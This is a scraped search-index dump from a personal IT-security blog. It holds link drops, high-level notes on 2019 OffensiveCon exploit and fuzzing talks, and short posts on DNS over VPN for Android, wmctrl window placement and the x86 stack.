","permalink":"https://blog.akendo.eu/flash/02.04.2019-linkdrop/","tags":null,"title":"02.04.2019 - link drop"},{"categories":null,"contents":" Threat Modeling: 12 Available Methods ","permalink":"https://blog.akendo.eu/flash/29.03.2019-linkdrop/","tags":null,"title":"29.03.2019 - link drop"},{"categories":null,"contents":"Another day, another set of links\nRemote Code Execution in Alpine Linux [Thoughts on Cloud Security](Thoughts on Cloud Security) ","permalink":"https://blog.akendo.eu/flash/23.03.2019-linkdrop/","tags":null,"title":"23.03.2019 - link drop"},{"categories":null,"contents":"I\u0026rsquo;ve some issues with DNS in Android. It\u0026rsquo;s quite hard to teach Android to use a different DNS server than it\u0026rsquo;s default one. It seems like that 8.8.8.8 is hard wired into the system. However, it\u0026rsquo;s possible to use a VPN tunnel to point to a custom DNS server instead. dns66 is a tool that allows to set custom servers. It should block traffic, but so far this did not work that well.\nNevertheless, I want to put an additional domain to it and use it to resolve a single IP for my VPN. But you can only run a single VPN endpoint. You can run only DNS66 or OpenVPN, not both\u0026hellip;..\nTo fix this I installed a dnsmasq on my VPN Server. It is configured to listen only to the VPN Interface.\napt-get install dnsmasq dnsutils The configuration consist of two lines:\nlisten-address=192.168.0.1 # IP of the tun0 interface bind-interfaces Afterward you have to ensure within iptables that the interface is allowed to access:\niptables -A INPUT -i tun0 -j ACCEPT Here the lazy version. Afterwards, you create an additional file for the records in /etc/dnsmasq.d/vpn with the content:\naddress=/xvz.akendo.eu/192.168.192.291 A restart of dnsmasq and you can validate it with dig.\nOpenVPN configuration To make the Android OpenVPN use of this, deploy this as a special option to the client. I\u0026rsquo;ve updated the configuration of the certificate in the ccd folder of openvpn.\n\u0026#34;dhcp-option DNS 192.168.0.1\u0026#34; A restart of the openvpn service should do it. To be honest, I do not know if that works correctly. I\u0026rsquo;ve also defined the DNS server manual in the android OpenVPN side to point to it. My manual test from a console emulator always resolved against 8.8.8.8. But the app that should find the record was able to find it.\nI won\u0026rsquo;t bother about this further. It\u0026rsquo;s working.\nbest regards, akendo\n","permalink":"https://blog.akendo.eu/post/2019-03-08-vpn-and-dns/","tags":null,"title":"DNS over VPN for Android"},{"categories":null,"contents":"Another set of links\nTanenbaum-Torvalds Debate Rust als sichere Programmiersprache für systemnahe und parallele Software -How Your Brain Can Control Time C Is Not a Low-level Language How your ethereum can be stolen through DNS rebinding ","permalink":"https://blog.akendo.eu/flash/08.03.2019-linkdrop/","tags":null,"title":"08.03.2019 - link drop"},{"categories":null,"contents":" Fuzzing Like It’s 1989 Implications of Rewriting a Browser Component in Rust ","permalink":"https://blog.akendo.eu/flash/01.03.2019-linkdrop/","tags":null,"title":"01.03.2019 - link drop"},{"categories":null,"contents":" 7 Practical Facts about the Human Brain I wish Everyone Knew - Leo Widrich - One of the best text in regards to emotion an neurosince I\u0026rsquo;ve read in a while ","permalink":"https://blog.akendo.eu/flash/27.02.2019-linkdrop/","tags":null,"title":"27.02.2019 - link drop"},{"categories":["Security"],"contents":"[Updated Analysis of PatchGuard on Windows RS4: Is the Mouse Finally Caught? by Luc Reginato](Updated Analysis of PatchGuard on Windows RS4: Is the Mouse Finally Caught? by Luc Reginato) Kernel patch protection (no one calls it this way). His diagram is over-simplfied. There are able to use static analysis. This talk is very in-depth and out of my domain of experience.\nPatchGuard consist of three components. It seems that there is only a 4% to occure. But it\u0026rsquo;s hard for me to make sense of this.\niOS Dual Booting Demystified by Max Bazaliy Dual boot in iOS. Using newer and older version of iOs or special flags. Apple has PKI that validates everything on the way. Has two ways for boot. Very complicated. Trustcache is a new thing in iOS 12. kernelcache holds the kernel and extensions. ramcache is not encrypted anymore. Trustchache aka Firmware.\nEach commend is represented by a structure in iBoot. The menu is hidden by default. There are different attack vectors to attack the bootloader. kernel -\u0026gt; bootload for example.\nIssues with the bootloader with Apples feature for KPP. Better way is to attack the bootloader from a bootloader. Modify the bootloader on the assembler level, allows to disable feature of the iOS kernel. You can\u0026rsquo;t disable KASLR, but use with zero slide.\nManual interaction takes a bit. Next level is using the XNU kernel with source. Apple seems to be very interesting to keep kernel features in place. There are feature within the MMU, that lock the kernel down. To prevent writing access to the kernel region. Some of the feature need to be patch out during the boot process. There goes a lot of work in there. Once it\u0026rsquo;s done you have a unprotected kernel where you can write things to.\nmacOS: How to Gain Root with CVE-2018-4193 in \u0026lt; 10s by Eloi Benoist-Vanderbeken A bug in the server for displaying stuff. Found by in-process fuzzing. Goal: To have a reliable exploit. There are quite some limitation to the bug. Including some null pointer that needs to be present here. Going to abuse some different infrastructure `mach port. We can overwrite a NULL pointer with a pointer.\nProblem: Find a good QWORD that can be overwritten. Absuing the CFdictionary because it will free the Null pointer. Took a deep looker into the CoreFoundation interals. This finds a memory sample that fits to the buggy array from the CVE. Problem here is that we only can specify a negative index. However, they can abuses the Heap things in a smart way and make allocation before the heap that can be reference in a negative way.\nBut it\u0026rsquo;s quite difficult to trigger this with the default malloc of apple. Spamming the heap does not work when done by a different CPU. ASLR in Mac is weak. Still this is a impressiv exploit. The defeat of the ASLR is quite heavy. Took 18 days to get it going.\n[Reverse Engineering of Error-Correcting Codes](Reverse Engineering of Error-Correcting Codes) Missed the intro ;( .ECC is hardware in the CPU. ECC needs to be fixed fast. ECC is undocumented. Using cold-boot for RE. Flip a bit and see what ECC does. They used a shorttage to create faulty bits. But this did not scale that well. Problem here: BIOS is setting the memory to find it\u0026rsquo;s perfect parameter and does reset the memory.\nBy passing by using coreboot, the reseting code part was submitted to the coreboot project by AMD. ECCplout -\u0026gt; get the same hardware as your vicitem. Extract the ECC algor. than using RowHammer. They focused only on the ECC part.\nAttack Surface of a Connected Vehicle by Minrui Yan note: The speakers were not a native speakers and it was diffcult to understand everyting correctly.\nAttacking a car. The internal IVI based on Andorid, does also have a lot of vulnerabilities. To start research, you can get parts from ebay. Buy an old cars and start to extract the old items out of it.\nConsider all parts like flash. T-Box: it has also a debug port. There are using eSIM. There is a token to control the car. That might all remote control of a car. Based on the service service architecture. Services are not exposed to the internet. We might are able to use the T-Box. It\u0026rsquo;s difficult to find the source of the attack.\nYou cann connect to the embeded devices thanks to linux default devices. Begin on the T-Box it\u0026rsquo;s possible to scan the ISV network. Might be hidden access for the ISVs? It\u0026rsquo;s possible to conect to the systems with re-wirring the cables. Also there is a USB connection that uses a HSB and can use adb to it. Tesla uses for example SD cards. Some of that cards are locked. But you can MitM with a logic anlayser and sniff out the password from the SD controller and the SD card.\nCheck the names from the ICs. For Tesla, they took of the emmc and put it onto a programmer to extract the firmware. It\u0026rsquo;s possible based on the data from the firmware to get the linux kernel that was used. An alternative is to use the an SPI programmer. (What\u0026rsquo;s the point about enumerating dumping firmware?)\ncontrol the car via the APN network. All services are running in the local network 0.0.0.0:XXXX. You could access over the APN network. control the car via the TSP. There are stroing secret key in the service. Was able to control via the API the car? Because it\u0026rsquo;s authenticated via SMS? control the car via the IVI. Connecting via the serial debug port to the Android system. Sending via writing data to the char devicds Another way with IVI. Connecting into the CAN bus. it\u0026rsquo;s than possible to open the doors, start the enging or trigger the braking. It\u0026rsquo;s possible to change the postion of the wheel. Personal note: Accessing the can bus seems senseful, CAN does not provide any authentiation.\nBypass Windows Exploit Guard ASR Tool for adding protection for Windows. For most unknown.\nHe writes VBscript to bypass the ASR. Uses the task scheduler to bypass stuff. He creates a new task and stop it. New generated task have not the office process as parent. It\u0026rsquo;s based on a rules set in the kernel, that can be by-passed with ease.\nFuzzIL: Guided Fuzzing for JavaScript Engines by Samuel Groß Finding flaws in JavaScript code that causing error at the engines. Classic fuzzing won\u0026rsquo;t work, because it would test the parser. Requirement one to always have validate JS code. You might generate validate code based on the grammatical rules. But this won\u0026rsquo;t really work and does not invoke issues with the JIT. Needs to be semantic correct too.\nMutation based approach. last requirements to have sensible mutation of the JavaScript that make sense. There are different levels of mutation\nSource code Syntax Tree (AST) Byte code His approach is to mutate the byte code (low level). He generates them via his fuzzer FuzzIL. After generating the byte code you can \u0026lsquo;Lifting\u0026rsquo; them to JS. First thing it does is the input mutator. Next is the operations mutator, change global functions. another is insertion mutation. Last one is the splice mutator. It just copies one part and another to it, based on randomness.\nAnother problem is minimization. Adding guided by adding a feedback mechanic in a similar fashion like afl does. He has some things on his todo, for example adding custom JS code sample to mute from.\nIdeas for improvements Starting at 08:00 ? Name tags: Help people that does not know each others to engage in conversations Improve the locations welcoming\u0026hellip; it was quite harsh getting into the into hotel Maybe better organisation of the chairs and numbers (rows lines) Numbers for the tables out-side Better transition of talks Areas to drop stuff like bottles or dishes Provide the slides before the presentation begins Better positioning for the beamer screen. For the people in the back the bottom is often cut off\u0026hellip; The coffee was medium\u0026hellip; Places for talks with more \u0026lsquo;privacy\u0026rsquo;, we had to abuse some unused conference rooms\u0026hellip;but that\u0026rsquo;s not always the soluton ","permalink":"https://blog.akendo.eu/post/2019-02-16-offensivcon-day-two/","tags":["Conference","Security","Offensive"],"title":"Offensive Conference day two"},{"categories":["Security"],"contents":"I\u0026rsquo;ve attend the Offensive Conference 2019 in Berlin. A in-depth technical security conference. What does in-depth imply? Exploit and technical talks with working exploits. You\u0026rsquo;re getting some stuff at entering\nOn the following page I keep track of some notes:\nTalks I attend the first half of the presentations. One pattern I saw across was the heavy usage of fuzzer.\nKeynote: Alex Ionescu First talk was from a Alex Ionescu about reversing without reversing. Tl;DR look at all possible sets of information that are there. Funny because he could reference source from Windows and used into ReactOS. It was inspiriting and frighten at the same time.\nModern Source Fuzzing by Ned Williamson Talking about the usage different approache to fuzz. He use of a Stream based Fuzzer approach. It\u0026rsquo;s a parser before the API call that will be consumed He think fuzzing like a water flow. He extend his concept with the idea of a Protobuf-based Fuzzing. I leak understanding of the Fuzzing nature in deep. However, this seems like a nice solution with a different approach to the classic fuzzing.\nWith his strategy he found a bug in the AppCache from Google Chrome. It was used for a exploit chain that lead to a RCE. New project is to moving the xnu kernel into a libary. libxnu will be fuzzed with his way. Issue with binaries because it\u0026rsquo;s hard time to patch.\nIPC You Outside the Sandbox: One bug to Rule the Chrome Broker by Niklas Baumstark This presentation is related to the previous one. It presents a exploit on the bug found before. Attacking the IPC in Chrome allows to exploit without ALsR. Defining the Cache of the image can be exploited. Each cache has a reversion. The important is that there is a pointer to the newest object. Creating a free-after-use bug with released cached. Allowing by exploiting the de-counter.\nIt is not possible to high-jack the vtable. Solution: Create a fake object. Heap going upwards: Spray the Heap (with 200 MB) Creating blobs that are pushed on the Heap. They need a information leak and get any address from the heap. There are using a \u0026lsquo;canonical cookie\u0026rsquo; to get there. Another idea was to corrupt the size of std::vec. Because of time constrain they had to throw away many ideas.\nIn the end they wrote the exploit in javaScript to load C++ Code into memory by abusing reflective DLL injection. These code will be executed within a separated threats using web threats. Impressive exploit.\n3D Accelerated Exploitation by Jason Matthyser Exploitation of the 3D extension implemented for VirtualBox using chrome (not the browser). chrom is abstracion layer to translate Opcode to calls for the GPU. This is done by allowing the client to made special ops calls to the OS. He uses a Fuzzer. Key is that the uses the OpCodes for the virtualisation. It will take the opscode the right handler. There are some issues with debugging the VM. So he created a standard interface for VirtualBox.\nThe vulnerabilities, we can define buffer with arbitrary size and can read from. (ouch\u0026hellip;) The vulnerabilities was boring for him, so instead of pushing shell code, he was redirecting stuff to execute instead.\nBugs so Nice they Patched them Twice! A (Continuing)? Story About Failed Patches by Jasiel Spelman, Brian Gorenc, Abdul-Aziz Hariri The focus of this talk was to look at adobe software with JS API and how adobe does fix reported vulnerabilities. Most of the time, exploits were bypasses the fixes of a bug. For example they fixed a bug that was a buffer overflow. The overflow was located in a if-else statement. Adobe was fixinig only the if case, but left the same overflow in the else cause unpatched.\nAnother example, you can use JavaScript to change aspects of the PDF. This feature has a 300 page documentation. People search for undocumented functions (there are a lot of them) that are intended only for professional services of Adobe. Most of the feature triggering free-after-use bugs like CVE-2016-0931 -\u0026gt; fixing by Adobe. They went through all the bugs with it and fixing them. The attacker changed by using a different function to trigger bugs\u0026hellip;.works fine..\nHave a classic heap overflow in the function. The fix after some months was to have a check for the value that was used in the exploit. Another sample of this is the xml parser. Note when you want to filter, you want to filter only a several nodes.\nBug: Defining a Marco that will work on debug with dynamic cast but a static cast in production\u0026hellip; allows type confusion\u0026hellip; Their fix is to replace all to a dynamic cast with null pointer fix. Can be crashed with a comment\nFast searching in pdf: Laxtek -\u0026gt; was not audited. Creating a index file, it can be corrupted and causing issues. It has not been fixed properly.\nAttacking Hardware Root of Trust from UEFI Firmware by Alex Matrosov Possible to bypass bootguard. TPM is broken -\u0026gt; Can be MitM. Bootguard is no part of UEFI Lenovo has a .SMI over WMI function to disable BootGuard. Was found during a Windows update. Question: Could that affect a linux system?\nThere is a UEFI module that provide access to the SMM from lenovo. With the WMI you don\u0026rsquo;t need a kernel module to make SMI calls. Most vendors try to reduce the SMI calls to minimal attack surface. Question: using the legecy mode would help (older laptops)? Q: Affected laptops? List will be provided. Q: Possible to reset the state with a re-flash of the UEFI? Yes it will be. But only when then entry chip is begin re-flashed. Q: Could we use this to install coreboot on any Lenovo device.? Sure with no TB you can place what ever you want on it.\nStores value in the nvram .Embedded Controller is not a security boundary. EC has DMA access and can attack other components. There is a separate flow for update an EC, in theory it. But in reality, they don\u0026rsquo;t have one. EC vendor has an issue with their update process. A not name vendor does not check the hash for updates correctly. Site note: IBG is not used by intel itself. It seems to be even possible to enable CPU debugging from OS! (WTF!). You need to flip a single bit to disable the BG feature. After three reboots it did work. Alex statement is that BG is a Marketing feature. He wonders why lenovo does not consider RE in their Threat Model.\nCoverage-Guided USB Fuzzing with Syzkaller by Andrey Konovalov I\u0026rsquo;ve skipped some talks. But this one seemed to be a good one about skycaller. The classic syscall fuzzing is called Trinity. It\u0026rsquo;s a basic fuzzer with calling random() on a syscalls. Linux kernel devs do not care about CVEs, they rather care for fixing bug.\nFor the skycaller is a language to describe syscalls. Andrey is not a kernel expert. Skycaller works like any other fuzzer. It try to do handle all these manual work. For example create ways to reproduce found crashes. Skycaller is quite small with 2k LoC. There have quite a lot of todos, for example ToDo for the project: Replacing different corpuses\nShowing a demo for syzkaller.appspot.com\nUSB provides an ID to the client, depending on id the will access the driver. USB can be seen with Wirehark. Skycaller will fuzz some of the usb stuff\nThe diagramm can be read better from bottom to the top.\nFaceDaner Using a Hypervisor to inject USB - vUSBf The kernel implements usb in a background threat. Using something like the Tun/tap infrastructure with USB to inject USB messages. (It\u0026rsquo;s not essay to do this with the kernel) They implement this with Gadget and the usb dummy function. Gadget is limited, instead a own kernel module was programmed. He found 80 bugs, half of them fixed the other was ignored.\nThe gadget does not support every option of an USB device. For improvement he uses a dwc2 driver, that is used for creating driver using the Rpi Zero. The same bug for the smsusb was not working. The module was missing. A issues when testing the fuzzing on a real device, it might have not been connected correctly. Question: Why only half of the bug where fixed? A: Bugs might be lost on the ML. Maintainer not anymore active one the problem\n","permalink":"https://blog.akendo.eu/post/2019-02-15-offensivcon-day-one/","tags":["Conference","Security","Offensive"],"title":"Offensive Conference day one"},{"categories":null,"contents":"Some news from my stack:\nThe Alarming Decline of Quality, Youth Playtime - I can\u0026rsquo;t tell much to this. However, I\u0026rsquo;ve noticed that addictiveness of modern games too. But where that better times of the PC ;-0 ? Capitalism and Inequality Locked doors, headaches, and intellectual need - Good lesson: Create first a problem first, before you solve it with math. Remote Code Execution in apt/apt-get ","permalink":"https://blog.akendo.eu/flash/02.02.2019-linkdrop/","tags":null,"title":"02.02.2019 - link drop"},{"categories":null,"contents":"Another day, another link:\nCloud Irregular: The Creeping IT Apocalypse ","permalink":"https://blog.akendo.eu/flash/20.01.2019-linkdrop/","tags":null,"title":"20.01.2019 - link drop"},{"categories":null,"contents":"Just a single post so far:\nStill in love with Rust ","permalink":"https://blog.akendo.eu/flash/18.01.2019-linkdrop/","tags":null,"title":"18.01.2019 - link drop"},{"categories":null,"contents":" The Relentlessness of Modern Parenting ","permalink":"https://blog.akendo.eu/flash/15.01.2019-linkdrop/","tags":null,"title":"15.01.2019 - link drop"},{"categories":null,"contents":"Another set of links:\nTheir pain is real – and for patients with mystery illnesses, help is coming from an unexpected source A look at home routers, and a surprising bug in Linux/MIPS what is consciousness Has dopamine got us hooked on tech? ","permalink":"https://blog.akendo.eu/flash/14.01.2019-linkdrop/","tags":null,"title":"14.01.2019 - link drop"},{"categories":null,"contents":"Here are my link drops for today. I\u0026rsquo;ve not shared any links in a while. But there are many links that have piled up over the last weeks. I like to share some here.\nStuff:\nDaniel Kahneman: Your Intuition Is Wrong, Unless These 3 Conditions Are Met Your Brain Is Constantly Searching for Problems to Fix The Reason Many Ultrarich People Aren’t Satisfied With Their Wealth The Peter Principle is a joke taken seriously. Is it true? Security:\nUnderstanding Golang TLS mutual authentication DoS – CVE-2018-16875 German data breach: agencies \u0026lsquo;failing to take security seriously\u0026rsquo; best regards, akendo\n","permalink":"https://blog.akendo.eu/flash/09.01.2019-linkdrop/","tags":null,"title":"09.01.2019 - link drop"},{"categories":null,"contents":"Bruce Schneier has published another Book with the title: \u0026ldquo;Click Here to Kill Everybody\u0026rdquo;. He made a video talk on Google about this:\n[](https://www.youtube.com/watch?v=GkJCI3_jbtg\u0026quot;Bruce Schneier: \u0026quot;Click Here to Kill Everybody\u0026quot; | Talks at Googl \u0026ldquo;)\nhave fun!\n","permalink":"https://blog.akendo.eu/post/2018-10-20-click-here-to-kill-everybody/","tags":null,"title":"Book:\"Click Here to Kill Everybody\""},{"categories":null,"contents":"Just on a quick note: Android have a \u0026lsquo;multiple\u0026rsquo; User features. The idea is simple and like in Windows. Different Users can share the same device. However, this feature is broken. The initial creation of a new User renders the phone useless till a reboot. Followed by a odd reboot cycle of several times. It took some time till switching was working and does each time have a slow down.\nYou can not just \u0026lsquo;simply\u0026rsquo; share files or apps. [0] It is possible to share files by using a special folder /sdcard/Android/obb to make it accessible to others. The Unix permission system underneath is completely not usable or of any sense here. There are not groups whatsoever and the new User might able to install Apps on his own, but only when these are not presented by the other user. Sharing App data seems to be not possible, at least not without any App[1]. It might be possible to have user share the same Google Play Account[2]. It does not tell how apps can be shared. Besides, there seems to be quite a lack on documentation to this regards. In the end the App might need to support this[3]. It feels like that even Windows 95 had got this better..\nso far akendo\n[0]https://stackoverflow.com/questions/21873645/share-data-between-users-on-multi-user-android-4-2-or-later#21896531\n[1]https://www.addictivetips.com/android/share-apps-between-user-accounts-on-android-4-2-tablets-appshare-plus/\n[2]https://android.stackexchange.com/questions/60087/how-do-i-share-apps-between-users-in-android-4-4-kitkat\n[3]https://source.android.com/devices/tech/admin/multiuser-apps\n","permalink":"https://blog.akendo.eu/post/2018-09-09-android-multi-user/","tags":null,"title":"Android Multi User"},{"categories":null,"contents":"Some days ago, I had a \u0026lsquo;discussion\u0026rsquo; on Twitter. It did not turn out to be that much of a discussion, but it was interesting after all. Long story short: I went over the paper(a host a copy of it) of Justin Kruger and David Dunning (short:Dunning-Kruger) and I notice something, there is quite a low numbers of participants in each of they studies. Furthermore most of the participants where undergraduates of the same university.I feel like that this is also dangerous to make conclusion by this low numbers. This makes it also quite difficult to blindly trust the study, see the Stanford marshmallow experiment for a reference.\nNeverthese less, this document is well made. I just feel like that there might be some doubt. A\nBut as Jeffrey Richman pointed out:\nAre you\u0026hellip; confidently disputing the veracity of a peer reviewed study about misplaced confidence?\nHowever it is Just a healthy doses of skepticism. All I\u0026rsquo;m saying is that we should not blindly trust the data their using without considering the numbers and the context. All their subjects where undergraduate and low in count. The expectation is that more older people might respond more differently, this might also apply to different social groups too. Yet I have to see a follow up study confirm it. But this think of myself might be the consequent of the Overconfidence effect. So I do not say that this theory is wrong. It might be even worse, depending on the environment people act on. The environment of people has a major effect on their ability to reflect on and understand their own flaws. A person who needs to change context and act in different topics like a nurse might be more aware than a farmer. But this is just a guess.\nIn end I just want to rewind this discussion a bit, because I like it. To conclude this discussion here is a a good link I like to share to the New York times.\n","permalink":"https://blog.akendo.eu/flash/05.09.2018-linkdrop/","tags":null,"title":"05.09.2018 - Flash post"},{"categories":null,"contents":" Find Your Passion’ Is Awful Advice €dit: I forgot to publish this one.\n","permalink":"https://blog.akendo.eu/flash/14.07.2018-linkdrop/","tags":null,"title":"14.07.2018 - Linkdrop"},{"categories":null,"contents":"https://unix.stackexchange.com/questions/91197/how-to-find-creation-date-of-file#91200 https://artist.cispa.saarland/res/papers/ARTist.pdf https://serverfault.com/questions/528065/how-to-edit-tcp-window-size-from-iptables#713675\n","permalink":"https://blog.akendo.eu/flash/26.06.2018-linkdrop/","tags":null,"title":"26.06.2018 - Linkdrop"},{"categories":null,"contents":"Some weeks or maybe months ago, my boss from Port Zero asked me to compose a small text about myself. Ohhhh did he know what type of trouble he just cause? Port Zero has a page about it\u0026rsquo;s employees.\nWhy is this a problem? Simple when there is one thing that\u0026rsquo;s hard, then it\u0026rsquo;s writing about yourself. Not that writing isn\u0026rsquo;t hard enough. The problem with such texts are, they are really difficult to get right. One point is to not undersell you, another point is not to sound like an arrogant prick. Many of the description of people often create a bizarre picture of them self. But maybe that\u0026rsquo;s my point of view? Anyway here a line that cause me headache:\nAkendo is an specialist for IT-security\nHere are some thoughts: Why I\u0026rsquo;m the specialist while all others not? It feels nasty and make me a bad impression. Another try:\nAkendo is specialized in IT-Security.\nAlmost the same word, but this way it sounds more humble, I think.\nWhat does this Team page help me? One might be wonder why I write this? This topic has raised some question about my personal openness. The company website was made public in the last days. Witch left a odd feeling. Putting a website into the Internet, into the wild is one thing. But also the source? For everyone to judge and act on? Maybe it\u0026rsquo;s a good step forward.\nI like to put some of my projects as also open source, but why wasn\u0026rsquo;t it done? A realisation came to mind. A notice that often I block myself from doing something. It gives me the impression that I I\u0026rsquo;m suffer from the \u0026ldquo;Einstellung problem\u0026rdquo;. In this case, the exposure of any information to the internet could lead an attacker to take advantage of this. However, this is leaving the fact out that there is none. But still, a feeling of anxiety arises, what when there will be an attacker? What\u0026hellip;.\nLost control about what\u0026rsquo;s going on\u0026hellip; The problem is so simple, as soon it\u0026rsquo;s in the internet it\u0026rsquo;s beyond control. I have similar feeling about writing for this blog. Now putting myself onto a website. Ouch\u0026hellip;.\nBut it\u0026rsquo;s progress! Moving on, instead of begin stuck to the feeling of anxiety. The real question is why shouldn\u0026rsquo;t anyone take a look at it? When they would ask me in person, I gladly would give them the information. But while being in the internet I\u0026rsquo;m hiding beneath the cover of privacy. But this is not who I\u0026rsquo;m. I have been always a open minded person, who believes that transparency is an important aspect of life. Showing who you are can help to improve both, the one that put himself to show and the other one that sees it.\nBecause of this anxiety, I need to write this texts! Only then progress will happen! Another feel that arises is a feeling of narcissism nature. Why must self-awareness hurt that much? But it\u0026rsquo;s not about the awareness. It\u0026rsquo;s about how to handle certain topic that are uncomfortable for someone. Most of the time we try to avoid them. We try not to do things that invokes a feeling of unwell. That\u0026rsquo;s the problem!\nIt\u0026rsquo;s fine to write about ones self. At times it\u0026rsquo;s necessary and helpful. It\u0026rsquo;s not narcissism, but a necessary reflection upon on self. That\u0026rsquo;s why it\u0026rsquo;s progress to do this. To open up. Sure they might be a risk implied, but does this risk out-weight the benefits?\n","permalink":"https://blog.akendo.eu/post/2018-06-12-texts/","tags":null,"title":"Texts about me"},{"categories":null,"contents":" When Overtaxed Working Memory Knocks Your Brain Out of Sync 28c3: The coming war on general computation ","permalink":"https://blog.akendo.eu/flash/10.06.2018-linkdrop/","tags":null,"title":"07.06.2018 -  Linkdrop"},{"categories":null,"contents":"Restarting a computer sucks. You have to typing in passwords, starting your windows manager, get all your default applications going and so on. It takes me several minutes to restart a system and get it into a workable state.\nParticularly in the last days, I had to restart various times forcefully. A critical error in the intel grahicstack breaks the multi monitor setup. Not working suspend to ram. A half way down suspended system, in which the fan keeps being active while remaining part of the systems is without a responses. Each time a system reset was necessary.\nHowever, i found some useful tool that allows me to \u0026lsquo;accelerate\u0026rsquo; the startup by quite a bit. wmctrlis the tool, that was found by browsing through the man page of fluxbox. What\u0026rsquo;s it? It\u0026rsquo;s a protocol the X Server is speaking, allowing to ask the Windows Manager for some information and/or actions. It allows you to give the windows manager some commands. Neat. The installation on archlinux was easy:\npacaur -S wmctrl Why do you need this? Simple: To allow to start up any application in fluxbux and place it on the right virtual desktop. Window Manager like KDE allows you to remember the state of windows before a logout, fluxbox don\u0026rsquo;t. So when you login again with KDE, all your old windows will be start on the right virtual desktop. But KDE consumes way to much resources\u0026hellip;so a solution for fluxbox is necessary.\nThe man page has all the details one might need to use it. I wrote down an example:\nurxvt -title urxvt -e tmux a \u0026amp; sleep 1 wmctrl -F -r \u0026#39;urxvt\u0026#39; -t 2 What does this example do?\nIt starts a urxvt terminal with a define title and within it will start the tmux a to re-attach to an open tmux session. Defining the title allow wmctrl to find the windows to move it to the right virtual desktop. The ID of a virtual desktop can be displayed with wmctrl -G -l command. One thing that did\u0026rsquo;t work out (yet), was setting the window to fullscreen. You can start urxvt will the paraemter -g with the right size. But this lead to some strange rendering bug and you can\u0026rsquo;t read anything from the terminal down. wmctrl can do this too. But I didn\u0026rsquo;t do it yet.\nAnyways, this makes a reboot a bit easier. But in the end, reboot sucks.\n","permalink":"https://blog.akendo.eu/post/2018-06-09-wmctrl/","tags":null,"title":"Controlling windows in X with wmctrl"},{"categories":null,"contents":"By using our website, you consent to the collection, processing, and usage of data as described below. Our website can be visited without registration. Data accessed on the site on the server are saved as “server log files” without being directly traceable to your person. These data provide useful information for statistics and attack-tracking. The following data are logged:\nAccessed pages and/or names of accessed files Date and time HTTP browser header Personal data, with exception of the IP address, specifically name, address and e-mail address shall not be collected.\nThe final segment of the IP address will not be collected by us; we can still monitor the IP range of the attacker in case of an external attack without storing your entire IP address. We will not disclose your data to third parties without your consent.\nWe reserve the right to subsequently review the server log files if we discover concrete evidence of illegal use.\nRight of Refusal and Information Options\nWe would like to make clear that you have right of access to your personal data collected by us (in case this statement is insufficient) and can––at any time––obtain the relevant information from us. Unless your request conflicts with a legal obligation to store data (e.g. data retention), you are entitled to the correction of incorrect data and to block or erase your personal data.\nPlease contact me for more information.\nAssertion of these rights is free of charge.\nPrinting and Saving this Privacy Notice\nYou may directly print and save this privacy notice by using the print and/or save function in your browser.\nUpdating this Privacy Notice\nUpdating this privacy notice may be necessary from time to time, due to new offerings on our website, for instance. You will be informed about any changes here.\nAbout this Privacy Notice\nThis Privacy Notice was provide by Port Zero\n","permalink":"https://blog.akendo.eu/privacy/","tags":null,"title":"Privacy Policy"},{"categories":null,"contents":"Some links I read today:\nFor mathematicians, = does not mean equality Playing battleships over BGP OWASP Mobile Security Testing Guide ","permalink":"https://blog.akendo.eu/flash/22.05.2018-linkdrop/","tags":null,"title":"22.05.2018 -  Linkdrop"},{"categories":null,"contents":"I created a workshop for Vagrant.\nhttps://gitpitch.com/akendo/Vagrant\n","permalink":"https://blog.akendo.eu/post/2018-04-12-vagrant_workshop/","tags":null,"title":"Vagrant workshop"},{"categories":null,"contents":" The Future of Incident Response Where the top of the stack is on x86 [Stack frame layout on x86-64 ] (https://eli.thegreenplace.net/2011/09/06/stack-frame-layout-on-x86-64/) Linux Inside - A series of posts about the linux kernel and its insides. Incident Response Tools OPSEC Resources Web OSINT Resources Offensive Security Research in Computer Architecture Conferences ","permalink":"https://blog.akendo.eu/flash/30.03.2018-linkdrop/","tags":null,"title":"30.03.2018 Linkdrop"},{"categories":null,"contents":"Before I begin, we need to clarify what a stack is first. For once, it\u0026rsquo;s a structure that represent data.\nThe Stack of a computer can be understood in different matters. Mostly as a way to represent current working chunks of memory a program needs to store it\u0026rsquo;s local context.\nThat\u0026rsquo;s a very strange to write\u0026hellip;. Let\u0026rsquo;s try it again: When a program is executing, it needs to store some of it\u0026rsquo;s memory somewhere. Memory is allocated in chunks. This chunks of memory will be \u0026lsquo;stacked\u0026rsquo;.\nThe importance of this \u0026lsquo;stacking\u0026rsquo; is, that once it\u0026rsquo;s layered down on the stack, it will be buried by the next item. Unless the next item is processed, it remains buried. You need to process the top of the stack, before the next time can be access.\nOnce you executes a programs, you will get a ESP. However during debugging with gdb, i notice something odd: the BSP keyword. Some search later, I figured out that this was point to the top of the stack. Just like ESP. Now: What\u0026rsquo;s the different between BSP and ESP?\nSo when you look at the assembler you will see thing like this:\n0x080483c4 \u0026lt;main+0\u0026gt;:\tpush ebp 0x080483c5 \u0026lt;main+1\u0026gt;:\tmov ebp,esp 0x080483c7 \u0026lt;main+3\u0026gt;:\tand esp,0xfffffff0 0x080483ca \u0026lt;main+6\u0026gt;:\tsub esp,0x50 0x080483cd \u0026lt;main+9\u0026gt;:\tlea eax,[esp+0x10] 0x080483d1 \u0026lt;main+13\u0026gt;:\tmov DWORD PTR [esp],eax 0x080483d4 \u0026lt;main+16\u0026gt;:\tcall 0x80482e8 \u0026lt;gets@plt\u0026gt; 0x080483d9 \u0026lt;main+21\u0026gt;:\tleave 0x080483da \u0026lt;main+22\u0026gt;:\tret Andrew Honig did a blog post about this topic. I quote:\nAt ebp is a pointer to ebp for the previous frame (this is why push ebp; mov ebp, esp is such a common way to start a function). This effectively creates a linked list of base pointers. This linked list makes it very easy to trace backwards up the stack. For example if foo() calls bar() and bar() calls baz() and you’re debugging baz() you can easily find the parameters and local variables for foo() and bar().\nbest regards, akendo\n","permalink":"https://blog.akendo.eu/post/2018-03-30-some-notes-about-the-stack/","tags":null,"title":"Some notes about the Stack"},{"categories":null,"contents":"Useful links:\nCS 161: Computer Security Spring 2018 The Key to Good Luck Is an Open Mind OPEN SECURITY TRAINING.INFO As a follow up link to the nautils one - Talking to Strangers (and other things that bring luck) How to Detect NMAP Scan Using Snort Snort, NMAP Ping scan and (fast) one line hacks Roof Topping: Lessons in Social Engineering from a Clandestine Photographer A surprising amount of people want to be in North Korea A Career Cold Start Algorithm Defcon 18 Build your own security operations center for little or no money Josh Pyorre Chris McKenny Part Today I took some time to write down likes I opened some days ago. I took the time to read though 